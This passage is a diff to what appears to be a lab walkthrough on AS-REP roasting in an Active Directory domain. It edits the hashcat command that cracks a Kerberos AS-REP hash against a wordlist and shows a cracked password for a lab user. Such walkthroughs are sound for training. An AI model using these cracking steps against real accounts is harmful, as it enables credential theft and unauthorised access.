@@ -571,7 +571,8 @@ $krb5asrep$23$anni@eagle.local:hash...
 **Step 3: Crack with hashcat**
 
 ```bash
-hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile=cracked.txt --force
+sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
+
 ```
 
 > 📌 **Hashcat Mode**: 18200 = Kerberos 5 AS-REP
@@ -579,7 +580,7 @@ hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile=cracked.txt --force
 **View cracked password:**
 
 ```bash
-cat cracked.txt
+sudo cat asrepcrack.txt
 # Output: $krb5asrep$23$anni@eagle.local:...:Slavi123
 ```
 
